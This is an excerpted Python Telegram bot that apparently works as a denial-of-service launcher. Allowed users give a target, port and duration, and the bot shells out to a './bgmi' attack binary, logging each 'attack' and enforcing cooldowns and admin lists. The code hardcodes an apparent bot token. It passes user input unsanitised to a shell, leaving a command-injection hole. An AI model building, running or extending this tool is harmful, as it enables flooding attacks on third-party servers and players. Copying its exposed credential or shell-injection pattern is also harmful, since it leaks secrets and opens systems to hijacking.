...
# Join :-  #from keep_alive import keep_alive
# Join :-  #keep_alive()
# Join :-  # insert your Telegram bot token here
bot = telebot.TeleBot('7413994906:AAHzH7EYN6DmcEtmu0580GCdjpAX9KDpjPQ')

# Join :-  # Admin user IDs
admin_id = ["1810257080","1720897406"]

# Join :-  # File to store allowed user IDs
USER_FILE = "users.txt"

# Join :-  # File to store command logs
LOG_FILE = "log.txt"
...
"https://134.73.65.97:6649"
    # Join :-  # Add more proxy addresses as needed
]
...
# Join :-  # Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Join :-  # Check if line is not empty
...
# Join :-  # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # Join :-  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Join :-  # Function to clear logs
def clear_logs():
    try:
...
# Join :-  # Function to record command logs
...
# Join :-  # Function to handle the reply when free users run the /bgmi command
...
# Join :-  # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 30:
                ...
                bot.reply_to(message, response)
                return
            # Join :-  # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Join :-  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Join :-  # Convert time to integer
            time = int(command[3])  # Join :-  # Convert port to integer
            if time > 600:
                response = "Error: Time interval must be less than 600."
            else:
                record_command_logs(user_id, '/GG', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Join :-  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 300"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /GG <target> <port> <time>"  # Join :-  # Updated command syntax
    else:
...
# Join :-  # Add /mylogs command to display logs recorded for bgmi and website commands
...
# Join :-  # Import the 'time' module for sleep functionality
import time
